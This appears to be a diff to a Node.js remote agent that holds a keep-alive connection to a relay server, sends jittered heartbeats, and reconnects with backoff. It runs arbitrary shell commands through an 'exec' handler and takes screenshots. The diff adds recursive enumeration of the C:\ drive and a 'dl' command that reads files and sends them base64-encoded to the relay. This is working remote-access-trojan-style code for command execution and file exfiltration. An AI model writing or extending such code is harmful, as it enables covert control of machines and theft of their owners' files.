@@ -1,5 +1,5 @@
 const net = require('net');
-const { execSync, exec } = require('child_process');
+const { execSync } = require('child_process');
 const os = require('os');
 const fs = require('fs');
 const path = require('path');
@@ -12,6 +12,11 @@ let fileServer = null;
 let cmdServer = null;
 let tailscaleIP = '';
 let drives = [];
+
+const AGENT_LOG = cfg.AGENT_LOG;
+function log(msg) {
+  try { fs.appendFileSync(AGENT_LOG, `[${new Date().toISOString()}] ${msg}\n`); } catch(e) {}
+}
 
 function detectTailscaleIP() {
   try {
@@ -61,10 +66,13 @@ function sendHeartbeat() {
   }
 }
 
+let reconnectAttempts = 0;
 function connectToRelay() {
   if (relayConn) try { relayConn.end(); } catch(e) {}
   relayConn = new net.Socket();
+  relayConn.setKeepAlive(true, 30000);
   relayConn.connect(cfg.RELAY_PORT, cfg.RELAY_IP, () => {
+    reconnectAttempts = 0;
     sendHeartbeat();
     if (heartbeatTimer) clearInterval(heartbeatTimer);
     heartbeatTimer = setInterval(sendHeartbeat, cfg.HEARTBEAT_INTERVAL + Math.floor(Math.random() * 10000));
@@ -80,9 +88,14 @@ function connectToRelay() {
   });
   relayConn.on('close', () => {
     relayConn = null;
+    const delay = Math.min(30000, 5000 * Math.pow(2, reconnectAttempts));
+    reconnectAttempts++;
+    setTimeout(connectToRelay, delay);
+  });
+  relayConn.on('error', () => {
+    relayConn = null;
     setTimeout(connectToRelay, 5000);
   });
-  relayConn.on('error', () => { relayConn = null; });
 }
 
 function handleRelayCommand(msg) {
@@ -104,13 +117,55 @@ function handleRelayCommand(msg) {
         break;
       }
       case 'tree': {
-        const dir = args || 'C:\\';
-        result = buildTree(dir, 0);
+        const parts = (args || '').split('|');
+        const dir = parts[0] || 'C:\\';
+        const maxDepth = parseInt(parts[1]) || 5;
+        result = buildTree(dir, 0, maxDepth);
         break;
       }
       case 'exec': {
         const out = execSync(args, { timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] }).toString();
         result = out;
+        break;
+      }
+      case 'listall': {
+        const parts = (args || '').split('|');
+        const dir = parts[0] || 'C:\\';
+        const maxDepth = parseInt(parts[1]) || 10;
+        const results = [];
+        function walk(d, depth) {
+          if (depth > maxDepth) return;
+          try {
+            const items = fs.readdirSync(d);
+            for (const name of items) {
+              const full = path.join(d, name);
+              try {
+                const stat = fs.statSync(full);
+                results.push({
+                  name, path: full, dir: stat.isDirectory(),
+                  size: stat.isDirectory() ? 0 : stat.size,
+                  mtime: stat.mtime.toISOString()
+                });
+                if (stat.isDirectory()) walk(full, depth + 1);
+              } catch(e) {}
+            }
+          } catch(e) {}
+        }
+        walk(dir, 0);
+        result = JSON.stringify(results, null, 2);
+        break;
+      }
+      case 'dl': {
+        const filePath = args;
+        const stat = fs.statSync(filePath);
+        if (stat.isDirectory()) { result = 'Error: Cannot download a directory'; break; }
+        if (stat.size > 50 * 1024 * 1024) { result = `Error: File too large (${Math.round(stat.size/1024/1024)}MB > 50MB limit)`; break; }
+        const content = fs.readFileSync(filePath);
+        result = JSON.stringify({
+          name: path.basename(filePath),
+          size: stat.size,
+          data: content.toString('base64')
+        });
         break;
       }
       case 'screenshot': {
@@ -128,8 +183,8 @@ function handleRelayCommand(msg) {
   if (relayConn && relayConn.writable) relayConn.write(resp);
 }
 
-function buildTree(dir, depth) {
-  if (depth > 4) return '  '.repeat(depth) + '... (max depth)\n';
+function buildTree(dir, depth, maxDepth) {
+  if (depth > (maxDepth || 4)) return '  '.repeat(depth) + '... (max depth)\n';
   let out = '';
   try {
     const items = fs.readdirSync(dir);
@@ -138,7 +193,7 @@ function buildTree(dir, depth) {
       let isDir = false;
       try { isDir = fs.statSync(full).isDirectory(); } catch(e) { continue; }
       out += '  '.repeat(depth) + (isDir ? '[DIR] ' : '[FIL] ') + name + '\n';
-      if (isDir) out += buildTree(full, depth + 1);
+      if (isDir) out += buildTree(full, depth + 1, maxDepth);
     }
   } catch(e) {}
   return out;
